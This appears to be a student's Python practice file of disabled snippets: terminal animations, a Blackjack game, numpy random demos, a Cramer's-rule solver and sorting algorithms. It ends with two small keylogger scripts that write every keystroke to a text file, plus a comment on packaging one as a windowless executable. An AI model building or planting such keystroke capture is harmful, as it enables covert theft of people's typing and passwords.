# заставка аквариум
if 0:
    import random, sys, time

    try:
        import bext
    except ImportError:
        print('This program requires the bext module, which you')
        print('can install by following the instructions at')
        print('https://pypi.org/project/Bext/')
        sys.exit()

    # Set up the constants:
    WIDTH, HEIGHT = bext.size()
    # We can't print to the last column on Windows without it adding a
    # newline automatically, so reduce the width by one:
    WIDTH -= 1

    NUM_KELP = 2  # (!) Try changing this to 10.
    NUM_FISH = 10  # (!) Try changing this to 2 or 100.
    NUM_BUBBLERS = 1  # (!) Try changing this to 0 or 10.
    FRAMES_PER_SECOND = 4  # (!) Try changing this number to 1 or 60.
    # (!) Try changing the constants to create a fish tank with only kelp,
    # or only bubblers.

    # NOTE: Every string in a fish dictionary should be the same length.
    FISH_TYPES = [
        {'right': ['><>'], 'left': ['<><']},
        {'right': ['>||>'], 'left': ['<||<']},
        {'right': ['>))>'], 'left': ['<[[<']},
        {'right': ['>||o', '>||.'], 'left': ['o||<', '.||<']},
        {'right': ['>))o', '>)).'], 'left': ['o[[<', '.[[<']},
        {'right': ['>-==>'], 'left': ['<==-<']},
        {'right': [r'>\\>'], 'left': ['<//<']},
        {'right': ['><)))*>'], 'left': ['<*(((><']},
        {'right': ['}-[[[*>'], 'left': ['<*]]]-{']},
        {'right': [']-<)))b>'], 'left': ['<d(((>-[']},
        {'right': ['><XXX*>'], 'left': ['<*XXX><']},
        {'right': ['_.-._.-^=>', '.-._.-.^=>',
                   '-._.-._^=>', '._.-._.^=>'],
         'left': ['<=^-._.-._', '<=^.-._.-.',
                  '<=^_.-._.-', '<=^._.-._.']},
    ]  # (!) Try adding your own fish to FISH_TYPES.
    LONGEST_FISH_LENGTH = 10  # Longest single string in FISH_TYPES.

    # The x and y positions where a fish runs into the edge of the screen:
    LEFT_EDGE = 0
    RIGHT_EDGE = WIDTH - 1 - LONGEST_FISH_LENGTH
    TOP_EDGE = 0
    BOTTOM_EDGE = HEIGHT - 2


    def main():
        global FISHES, BUBBLERS, BUBBLES, KELPS, STEP
        bext.bg('black')
        bext.clear()

        # Generate the global variables:
        FISHES = []
        for i in range(NUM_FISH):
            FISHES.append(generateFish())

        # NOTE: Bubbles are drawn, but not the bubblers themselves.
        BUBBLERS = []
        for i in range(NUM_BUBBLERS):
            # Each bubbler starts at a random position.
            BUBBLERS.append(random.randint(LEFT_EDGE, RIGHT_EDGE))
        BUBBLES = []

        KELPS = []
        for i in range(NUM_KELP):
            kelpx = random.randint(LEFT_EDGE, RIGHT_EDGE)
            kelp = {'x': kelpx, 'segments': []}
            # Generate each segment of the kelp:
            for i in range(random.randint(6, HEIGHT - 1)):
                kelp['segments'].append(random.choice(['(', ')']))
            KELPS.append(kelp)

        # Run the simulation:
        STEP = 1
        while True:
            simulateAquarium()
            drawAquarium()
            time.sleep(1 / FRAMES_PER_SECOND)
            clearAquarium()
            STEP += 1


    def getRandomColor():
        """Return a string of a random color."""
        return random.choice(('black', 'red', 'green', 'yellow', 'blue',
                              'purple', 'cyan', 'white'))


    def generateFish():
        """Return a dictionary that represents a fish."""
        fishType = random.choice(FISH_TYPES)

        # Set up colors for each character in the fish text:
        colorPattern = random.choice(('random', 'head-tail', 'single'))
        fishLength = len(fishType['right'][0])
        if colorPattern == 'random':  # All parts are randomly colored.
            colors = []
            for i in range(fishLength):
                colors.append(getRandomColor())
        if colorPattern == 'single' or colorPattern == 'head-tail':
            colors = [getRandomColor()] * fishLength  # All the same color.
        if colorPattern == 'head-tail':  # Head/tail different from body.
            headTailColor = getRandomColor()
            colors[0] = headTailColor  # Set head color.
            colors[-1] = headTailColor  # Set tail color.

        # Set up the rest of fish data structure:
        fish = {'right': fishType['right'],
                'left': fishType['left'],
                'colors': colors,
                'hSpeed': random.randint(1, 6),
                'vSpeed': random.randint(5, 15),
                'timeToHDirChange': random.randint(10, 60),
                'timeToVDirChange': random.randint(2, 20),
                'goingRight': random.choice([True, False]),
                'goingDown': random.choice([True, False])}

        # 'x' is always the leftmost side of the fish body:
        fish['x'] = random.randint(0, WIDTH - 1 - LONGEST_FISH_LENGTH)
        fish['y'] = random.randint(0, HEIGHT - 2)
        return fish


    def simulateAquarium():
        """Simulate the movements in the aquarium for one step."""
        global FISHES, BUBBLERS, BUBBLES, KELP, STEP

        # Simulate the fish for one step:
        for fish in FISHES:
            # Move the fish horizontally:
            if STEP % fish['hSpeed'] == 0:
                if fish['goingRight']:
                    if fish['x'] != RIGHT_EDGE:
                        fish['x'] += 1  # Move the fish right.
                    else:
                        fish['goingRight'] = False  # Turn the fish around.
                        fish['colors'].reverse()  # Turn the colors around.
                else:
                    if fish['x'] != LEFT_EDGE:
                        fish['x'] -= 1  # Move the fish left.
                    else:
                        fish['goingRight'] = True  # Turn the fish around.
                        fish['colors'].reverse()  # Turn the colors around.

            # Fish can randomly change their horizontal direction:
            fish['timeToHDirChange'] -= 1
            if fish['timeToHDirChange'] == 0:
                fish['timeToHDirChange'] = random.randint(10, 60)
                # Turn the fish around:
                fish['goingRight'] = not fish['goingRight']

            # Move the fish vertically:
            if STEP % fish['vSpeed'] == 0:
                if fish['goingDown']:
                    if fish['y'] != BOTTOM_EDGE:
                        fish['y'] += 1  # Move the fish down.
                    else:
                        fish['goingDown'] = False  # Turn the fish around.
                else:
                    if fish['y'] != TOP_EDGE:
                        fish['y'] -= 1  # Move the fish up.
                    else:
                        fish['goingDown'] = True  # Turn the fish around.

            # Fish can randomly change their vertical direction:
            fish['timeToVDirChange'] -= 1
            if fish['timeToVDirChange'] == 0:
                fish['timeToVDirChange'] = random.randint(2, 20)
                # Turn the fish around:
                fish['goingDown'] = not fish['goingDown']

        # Generate bubbles from bubblers:
        for bubbler in BUBBLERS:
            # There is a 1 in 5 chance of making a bubble:
            if random.randint(1, 5) == 1:
                BUBBLES.append({'x': bubbler, 'y': HEIGHT - 2})

        # Move the bubbles:
        for bubble in BUBBLES:
            diceRoll = random.randint(1, 6)
            if (diceRoll == 1) and (bubble['x'] != LEFT_EDGE):
                bubble['x'] -= 1  # Bubble goes left.
            elif (diceRoll == 2) and (bubble['x'] != RIGHT_EDGE):
                bubble['x'] += 1  # Bubble goes right.

            bubble['y'] -= 1  # The bubble always goes up.

        # Iterate over BUBBLES in reverse because I'm deleting from BUBBLES
        # while iterating over it.
        for i in range(len(BUBBLES) - 1, -1, -1):
            if BUBBLES[i]['y'] == TOP_EDGE:  # Delete bubbles that reach the top.
                del BUBBLES[i]

        # Simulate the kelp waving for one step:
        for kelp in KELPS:
            for i, kelpSegment in enumerate(kelp['segments']):
                # 1 in 20 chance to change waving:
                if random.randint(1, 20) == 1:
                    if kelpSegment == '(':
                        kelp['segments'][i] = ')'
                    elif kelpSegment == ')':
                        kelp['segments'][i] = '('


    def drawAquarium():
        """Draw the aquarium on the screen."""
        global FISHES, BUBBLERS, BUBBLES, KELP, STEP

        # Draw quit message.
        bext.fg('white')
        bext.goto(0, 0)
        print('Fish Tank, by Al Sweigart    Ctrl-C to quit.', end='')

        # Draw the bubbles:
        bext.fg('white')
        for bubble in BUBBLES:
            bext.goto(bubble['x'], bubble['y'])
            print(random.choice(('o', 'O')), end='')

        # Draw the fish:
        for fish in FISHES:
            bext.goto(fish['x'], fish['y'])

            # Get the correct right- or left-facing fish text.
            if fish['goingRight']:
                fishText = fish['right'][STEP % len(fish['right'])]
            else:
                fishText = fish['left'][STEP % len(fish['left'])]

            # Draw each character of the fish text in the right color.
            for i, fishPart in enumerate(fishText):
                bext.fg(fish['colors'][i])
                print(fishPart, end='')

        # Draw the kelp:
        bext.fg('green')
        for kelp in KELPS:
            for i, kelpSegment in enumerate(kelp['segments']):
                if kelpSegment == '(':
                    bext.goto(kelp['x'], BOTTOM_EDGE - i)
                elif kelpSegment == ')':
                    bext.goto(kelp['x'] + 1, BOTTOM_EDGE - i)
                print(kelpSegment, end='')

        # Draw the sand on the bottom:
        bext.fg('yellow')
        bext.goto(0, HEIGHT - 1)
        print(chr(9617) * (WIDTH - 1), end='')  # Draws '░' characters.

        sys.stdout.flush()  # (Required for bext-using programs.)


    def clearAquarium():
        """Draw empty spaces over everything on the screen."""
        global FISHES, BUBBLERS, BUBBLES, KELP

        # Draw the bubbles:
        for bubble in BUBBLES:
            bext.goto(bubble['x'], bubble['y'])
            print(' ', end='')

        # Draw the fish:
        for fish in FISHES:
            bext.goto(fish['x'], fish['y'])

            # Draw each character of the fish text in the right color.
            print(' ' * len(fish['left'][0]), end='')

        # Draw the kelp:
        for kelp in KELPS:
            for i, kelpSegment in enumerate(kelp['segments']):
                bext.goto(kelp['x'], HEIGHT - 2 - i)
                print('  ', end='')

        sys.stdout.flush()  # (Required for bext-using programs.)


    # If this program was run (instead of imported), run the game:
    if __name__ == '__main__':
        try:
            main()
        except KeyboardInterrupt:
            sys.exit()  # When Ctrl-C is pressed, end the program.

# numpy.random
if False:
    import numpy as np

    if 0:
        np.random.seed(1000)  # семя рандома

    if 0:
        n = 4
        print(f'Массив размера 1x{n} случайных чисел в диапазоне [0..1]: {np.random.rand(n)}')

    if 1:
        size = (2, 3, 4)
        print(f'Массив размера {size} случайных чисел в диапазоне [0..1]:')
        print(np.random.random(size=size))

    if 0:
        a, b = 9, 39
        n, m, k, d = 3, 4, 2, 5  # размер массива
        print(f'Массив размера 1x{n} случайных целых чисел из диапазона [{a}..{b}]: {np.random.randint(a, b, (n,))}')
        print(f'Массив размера {n}x{m} случайных целых чисел из диапазона [{a}..{b}]:')
        print(f'{np.random.randint(a, b, (n, m))}')
        print(f'Массив размера {n}x{m}x{k}x{d} случайных целых чисел из диапазона [{a}..{b}]:')
        print(f'{np.random.randint(a, b, (n, m, k, d))}')
        print('Размерность массива может быть n-мерной')

    if 0:
        a, b = 9.2, 39.7
        print(np.random.uniform(a, b, size=(3, 2)))

    if 0:
        n, m, k, d = 3, 4, 2, 5  # размер массива
        print(f'Массив размера {n}x{m}x{k}x{d} случайных вещественных чисел {np.random.randn(n, m, k, d)}')

    if 0:
        lst = ['Паша', 'Гриша', 8, True, -0.7]
        arr = np.array(lst)
        n, m, k, d = 3, 4, 2, 5  # размер массива
        print(f'Случайное целое число из диапазона [0..{n}) : {np.random.choice(n, replace=True)}')
        print(
            f'Массив размера {m}х{k} случайных целых чисел из диапазона [0..{n}) : {np.random.choice(n, (m, k), replace=True)}')
        print(
            f'Массив размера {m}х{k}x{d} случайных целых чисел из диапазона [0..{n}) : {np.random.choice(n, (m, k, d))}')
        print('Размерность массива может быть n-мерной')
        print(f'Случайный элемент из списка {lst}: {np.random.choice(lst)}')
        print(f'Случайный элемент из массива {arr}: {np.random.choice(arr)}')
        print()
        print(
            f'Массив размера {n}х{m} случайных элементов из списка {lst}: {np.random.choice(lst, (n, m), replace=True)}')
        print(
            f'Массив размера {n}х{m}x{k}x{d} случайных элементов из списка {lst}: {np.random.choice(lst, (n, m, k, d))}')
        print('Размерность массива может быть n-мерной')

    if 0:
        loc = 3  # точка отсчета нормального распределения
        size = (3, 4, 2, 5)  # размер массива
        print(f'Массив нормально распределенных данных от точки {loc}:')
        print(f'{np.random.normal(loc=loc, size=size)}')
        import matplotlib.pyplot as plt

        plt.hist(np.random.normal(loc=loc, size=300), 50)
        plt.show()

    if 0:
        arr = np.array([0, 1, 2, 3, 4, 5, 6, 7])
        print(f'Исходный массив: {arr}')
        np.random.shuffle(arr)
        print(f'Перемешанный массив: {arr}')

# Matrix by Kianu Rivs
if 0:
    import random, shutil, sys, time
    from colorama import Fore

    # Set up the constants:
    MIN_STREAM_LENGTH = 6  # (!) Try changing this to 1 or 50.
    MAX_STREAM_LENGTH = 14  # (!) Try changing this to 100.
    PAUSE = 0.1  # (!) Try changing this to 0.0 or 2.0.
    STREAM_CHARS = ['0', '1']  # (!) Try changing this to other characters.

    # Density can range from 0.0 to 1.0:
    DENSITY = 0.02  # (!) Try changing this to 0.10 or 0.30.

    WIDTH = shutil.get_terminal_size()[0]  # Get the size of the terminal window:
    # We can't print to the last column on Windows without it adding a
    # newline automatically, so reduce the width by one:
    WIDTH -= 1

    print('Press Ctrl-C to quit from matrix')
    time.sleep(2)

    try:
        # For each column, when the counter is 0, no stream is shown.
        # Otherwise, it acts as a counter for how many times a 1 or 0
        # should be displayed in that column.
        columns = [0] * WIDTH
        while True:
            # Set up the counter for each column:
            for i in range(WIDTH):
                if columns[i] == 0:
                    if random.random() <= DENSITY:
                        # Restart a stream on this column.
                        columns[i] = random.randint(MIN_STREAM_LENGTH, MAX_STREAM_LENGTH)

                # Display an empty space or a 1/0 character.
                if columns[i] > 0:
                    print(Fore.GREEN + random.choice(STREAM_CHARS), end='')
                    columns[i] -= 1
                else:
                    print(' ', end='')
            print()  # Print a newline at the end of the row of columns.
            sys.stdout.flush()  # Make sure text appears on the screen.
            time.sleep(PAUSE)
    except KeyboardInterrupt:
        sys.exit()  # When Ctrl-C is pressed, end the program.

# show dna
if 0:
    import random, sys, time

    PAUSE = 0.15  # (!) Try changing this to 0.5 or 0.0.

    # These are the individual rows of the DNA animation:
    ROWS = [
        # 123456789 <- Use this to measure the number of spaces:
        '         ##',  # Index 0 has no {}.
        '        #{}-{}#',
        '       #{}---{}#',
        '      #{}-----{}#',
        '     #{}------{}#',
        '    #{}------{}#',
        '    #{}-----{}#',
        '     #{}---{}#',
        '     #{}-{}#',
        '      ##',  # Index 9 has no {}.
        '     #{}-{}#',
        '     #{}---{}#',
        '    #{}-----{}#',
        '    #{}------{}#',
        '     #{}------{}#',
        '      #{}-----{}#',
        '       #{}---{}#',
        '        #{}-{}#']
    # 123456789 <- Use this to measure the number of spaces:

    try:
        print('DNA Animation, by Al Sweigart al@inventwithpython.com')
        print('Press Ctrl-C to quit...')
        time.sleep(2)
        rowIndex = 0

        while True:  # Main program loop.
            # Increment rowIndex to draw next row:
            rowIndex = rowIndex + 1
            if rowIndex == len(ROWS):
                rowIndex = 0

            # Row indexes 0 and 9 don't have nucleotides:
            if rowIndex == 0 or rowIndex == 9:
                print(ROWS[rowIndex])
                continue

            # Select random nucleotide pairs, guanine-cytosine and
            # adenine-thymine:
            randomSelection = random.randint(1, 4)
            if randomSelection == 1:
                leftNucleotide, rightNucleotide = 'A', 'T'
            elif randomSelection == 2:
                leftNucleotide, rightNucleotide = 'T', 'A'
            elif randomSelection == 3:
                leftNucleotide, rightNucleotide = 'C', 'G'
            elif randomSelection == 4:
                leftNucleotide, rightNucleotide = 'G', 'C'

            # Print the row.
            print(ROWS[rowIndex].format(leftNucleotide, rightNucleotide))
            time.sleep(PAUSE)  # Add a slight pause.
    except KeyboardInterrupt:
        sys.exit()  # When Ctrl-C is pressed, end the program.

# Black-Jack
if 0:
    import random, sys

    # Set up the constants:
    HEARTS = chr(9829)  # Character 9829 is '♥'.
    DIAMONDS = chr(9830)  # Character 9830 is '♦'.
    SPADES = chr(9824)  # Character 9824 is '♠'.
    CLUBS = chr(9827)  # Character 9827 is '♣'.
    # (A list of chr codes is at https://inventwithpython.com/charactermap)
    BACKSIDE = 'backside'


    def main():
        print('''
        Rules:
          Try to get as close to 21 without going over.
          Kings, Queens, and Jacks are worth 10 points.
          Aces are worth 1 or 11 points.
          Cards 2 through 10 are worth their face value.
          (H)it to take another card.
          (S)tand to stop taking cards.
          On your first play, you can (D)ouble down to increase your bet
          but must hit exactly one more time before standing.
          In case of a tie, the bet is returned to the player.
          The dealer stops hitting at 17.''')

        money = 5000
        while True:  # Main game loop.
            # Check if the player has run out of money:
            if money <= 0:
                print("You're broke!")
                print("Good thing you weren't playing with real money.")
                print('Thanks for playing!')
                sys.exit()

            # Let the player enter their bet for this round:
            print('Money:', money)
            bet = getBet(money)

            # Give the dealer and player two cards from the deck each:
            deck = getDeck()
            dealerHand = [deck.pop(), deck.pop()]
            playerHand = [deck.pop(), deck.pop()]

            # Handle player actions:
            print('Bet:', bet)
            while True:  # Keep looping until player stands or busts.
                displayHands(playerHand, dealerHand, False)
                print()

                # Check if the player has bust:
                if getHandValue(playerHand) > 21:
                    break

                # Get the player's move, either H, S, or D:
                move = getMove(playerHand, money - bet)

                # Handle the player actions:
                if move == 'D':
                    # Player is doubling down, they can increase their bet:
                    additionalBet = getBet(min(bet, (money - bet)))
                    bet += additionalBet
                    print('Bet increased to {}.'.format(bet))
                    print('Bet:', bet)

                if move in ('H', 'D'):
                    # Hit/doubling down takes another card.
                    newCard = deck.pop()
                    rank, suit = newCard
                    print('You drew a {} of {}.'.format(rank, suit))
                    playerHand.append(newCard)

                    if getHandValue(playerHand) > 21:
                        # The player has busted:
                        continue

                if move in ('S', 'D'):
                    # Stand/doubling down stops the player's turn.
                    break

            # Handle the dealer's actions:
            if getHandValue(playerHand) <= 21:
                while getHandValue(dealerHand) < 17:
                    # The dealer hits:
                    print('Dealer hits...')
                    dealerHand.append(deck.pop())
                    displayHands(playerHand, dealerHand, False)

                    if getHandValue(dealerHand) > 21:
                        break  # The dealer has busted.
                    input('Press Enter to continue...')
                    print('\n\n')

            # Show the final hands:
            displayHands(playerHand, dealerHand, True)

            playerValue = getHandValue(playerHand)
            dealerValue = getHandValue(dealerHand)
            # Handle whether the player won, lost, or tied:
            if dealerValue > 21:
                print('Dealer busts! You win ${}!'.format(bet))
                money += bet
            elif (playerValue > 21) or (playerValue < dealerValue):
                print('You lost!')
                money -= bet
            elif playerValue > dealerValue:
                print('You won ${}!'.format(bet))
                money += bet
            elif playerValue == dealerValue:
                print('It\'s a tie, the bet is returned to you.')

            input('Press Enter to continue...')
            print('\n\n')


    def getBet(maxBet):
        """Ask the player how much they want to bet for this round."""
        while True:  # Keep asking until they enter a valid amount.
            print('How much do you bet? (1-{}, or QUIT)'.format(maxBet))
            bet = input('> ').upper().strip()
            if bet == 'QUIT':
                print('Thanks for playing!')
                sys.exit()

            if not bet.isdecimal():
                continue  # If the player didn't enter a number, ask again.

            bet = int(bet)
            if 1 <= bet <= maxBet:
                return bet  # Player entered a valid bet.


    def getDeck():
        """Return a list of (rank, suit) tuples for all 52 cards."""
        deck = []
        for suit in (HEARTS, DIAMONDS, SPADES, CLUBS):
            for rank in range(2, 11):
                deck.append((str(rank), suit))  # Add the numbered cards.
            for rank in ('J', 'Q', 'K', 'A'):
                deck.append((rank, suit))  # Add the face and ace cards.
        random.shuffle(deck)
        return deck


    def displayHands(playerHand, dealerHand, showDealerHand):
        """Show the player's and dealer's cards. Hide the dealer's first
        card if showDealerHand is False."""
        print()
        if showDealerHand:
            print('DEALER:', getHandValue(dealerHand))
            displayCards(dealerHand)
        else:
            print('DEALER: ???')
            # Hide the dealer's first card:
            displayCards([BACKSIDE] + dealerHand[1:])

        # Show the player's cards:
        print('PLAYER:', getHandValue(playerHand))
        displayCards(playerHand)


    def getHandValue(cards):
        """Returns the value of the cards. Face cards are worth 10, aces are
        worth 11 or 1 (this function picks the most suitable ace value)."""
        value = 0
        numberOfAces = 0

        # Add the value for the non-ace cards:
        for card in cards:
            rank = card[0]  # card is a tuple like (rank, suit)
            if rank == 'A':
                numberOfAces += 1
            elif rank in ('K', 'Q', 'J'):  # Face cards are worth 10 points.
                value += 10
            else:
                value += int(rank)  # Numbered cards are worth their number.

        # Add the value for the aces:
        value += numberOfAces  # Add 1 per ace.
        for i in range(numberOfAces):
            # If another 10 can be added without busting, do so:
            if value + 10 <= 21:
                value += 10

        return value


    def displayCards(cards):
        """Display all the cards in the cards list."""
        rows = ['', '', '', '', '']  # The text to display on each row.

        for i, card in enumerate(cards):
            rows[0] += ' ___  '  # Print the top line of the card.
            if card == BACKSIDE:
                # Print a card's back:
                rows[1] += '|## | '
                rows[2] += '|###| '
                rows[3] += '|_##| '
            else:
                # Print the card's front:
                rank, suit = card  # The card is a tuple data structure.
                rows[1] += '|{} | '.format(rank.ljust(2))
                rows[2] += '| {} | '.format(suit)
                rows[3] += '|_{}| '.format(rank.rjust(2, '_'))

        # Print each row on the screen:
        for row in rows:
            print(row)


    def getMove(playerHand, money):
        """Asks the player for their move, and returns 'H' for hit, 'S' for
        stand, and 'D' for double down."""
        while True:  # Keep looping until the player enters a correct move.
            # Determine what moves the player can make:
            moves = ['(H)it', '(S)tand']

            # The player can double down on their first move, which we can
            # tell because they'll have exactly two cards:
            if len(playerHand) == 2 and money > 0:
                moves.append('(D)ouble down')

            # Get the player's move:
            movePrompt = ', '.join(moves) + '> '
            move = input(movePrompt).upper()
            if move in ('H', 'S'):
                return move  # Player has entered a valid move.
            if move == 'D' and '(D)ouble down' in moves:
                return move  # Player has entered a valid move.


    # If the program is run (instead of imported), run the game:
    if __name__ == '__main__':
        main()

# Крамер для СЛАУ
if False:
    from copy import deepcopy
    from colorama import Fore, init

    init(autoreset=True)


    def input_matrix(rows, cols):
        """Ввод СЛАУ"""
        A, B = [], []
        for row in range(rows):
            l = input(str(row + 1) + ': ').strip().split()
            for i in range(len(l)): l[i] = float(l[i])
            A.append(l[:cols])
            B.append([l[cols]])
        return A, B


    def output_matrix(A, B):
        """Вывод СЛАУ"""
        for row in range(len(A)):
            for col in range(len(A[row])):
                print(A[row][col], end=' ')
            print('|', B[row][0])


    def minor(M, row2del, col2del) -> list[int | float]:
        """Вычеркивание строки и столбца"""
        Mi = []
        for r in range(len(M)):
            if row2del != r:
                Mi.append([])
                for c in range(len(M[row2del])):
                    if col2del != c:
                        Mi[-1].append(M[r][c])
        return Mi


    def determinant(M) -> int | float:
        """Нахождение определителя матрицы"""
        if len(M) == 1: return M[0][0]
        res = 0
        k = 1  # знак
        for col in range(len(M[0])):
            res += k * M[0][col] * determinant(minor(M, 0, col))
            k *= -1
        return res


    def Kramer_Function(A, B, det):
        """Нахождение корней СЛАУ методом Крамера"""
        for j in range(len(A)):
            lst = deepcopy(A)
            for row in range(len(A)):
                lst[row][j] = B[row][0]
            print('x' + str(j + 1), '=', determinant(lst) / det)


    if __name__ == '__main__':
        while True:
            while True:
                rang = input('Введите ранг матрицы: ')
                if rang.isdigit() and int(rang) >= 1:
                    rang = int(rang)
                    break
                else:
                    print(colorama.Fore.RED + 'Введено некорректное значение!')

            print()
            A, B = input_matrix(rang, rang)
            print()
            output_matrix(A, B)
            print()
            det = determinant(A)
            if det == 0:
                print(Fore.RED + 'CЛАУ не определена!\nПопробуйте снова!')
                continue
            else:
                Kramer_Function(A, B, det)
                input()
                break

    # pyinstaller --onefile extract_wifi_password.py

# sorts
if False:
    from numpy.random import randint

    N = 5
    arr = randint(0, 10, N)
    print(f'arr: {arr}')
    lst = list(arr)
    print(f'lst: {lst}')

    # встроенная сортировка
    if 0:
        arr.sort()
        print(f'arr: {arr}')
        lst.sort()
        print(f'lst: {lst}')

    # Пузырек = bubble sort
    if 0:
        for i in range(len(lst) - 1):
            for j in range(len(lst) - i - 1):
                if lst[j] > lst[j + 1]:
                    lst[j], lst[j + 1] = lst[j + 1], lst[j]
        print(f'sorted lst: {lst}')

    # Пузырек с флагом = bubble sort with flag
    if 0:
        while True:
            flag = False
            for j in range(len(lst) - 1):
                if lst[j] > lst[j + 1]:
                    lst[j], lst[j + 1] = lst[j + 1], lst[j]
                    flag = True
            if not flag: break
        print(f'sorted lst: {lst}')

    # Вставки = insertion
    if 0:
        for i in range(1, len(lst)):
            item = lst[i]
            i2 = i - 1
            while i2 >= 0 and lst[i2] > item:
                lst[i2 + 1] = lst[i2]
                i2 -= 1
            lst[i2 + 1] = item
        print(f'sorted lst: {lst}')

    # Выборка = selection
    if 0:
        for i in range(len(lst)):
            index = i
            for j in range(i + 1, len(lst)):
                if lst[j] < lst[index]:
                    index = j
            lst[i], lst[index] = lst[index], lst[i]
        print(f'sorted lst: {lst}')

    # Слияние = merge
    if 1:
        def merge_sort(n):
            if len(n) > 1:
                mid = len(n) // 2
                left = n[:mid]
                right = n[mid:]
                merge_sort(left)
                merge_sort(right)

                i = j = k = 0

                while i < len(left) and j < len(right):
                    if left[i] < right[j]:
                        n[k] = left[i]
                        i += 1
                    else:
                        n[k] = right[j]
                        j += 1
                    k += 1

                while i < len(left):
                    n[k] = left[i]
                    i += 1
                    k += 1
                while j < len(right):
                    n[k] = right[j]
                    j += 1
                    k += 1
            return n


        print(f'sorted lst: {merge_sort(lst)}')

# keyboard
if False:
    import keyboard

    if 0:
        with open('keys.txt', 'w+', encoding='utf-8') as file:
            while True:
                old = file.read()
                text = keyboard.read_key()
                # text = text.replace('space', ' ')
                file.write(old + text)

    if 0:
        rc = keyboard.record('Esc')
        print([x.name for x in rc])

    # pyinstaller --onefile -w trackkeys.py

if False:
    import keyboard

    # Открываем файл для записи
    with open("keylog.txt", "w") as f:
        f.write("Keylogger started\n")


    def on_key_event(e):
        '''Функция для записи нажатых клавиш в файл'''
        with open("keylog.txt", "a") as f:
            f.write(str(e.name) + "\n")


    keyboard.hook(on_key_event)  # Устанавливаем обработчик событий нажатия клавиш
    keyboard.wait()  # Запускаем цикл обработки событий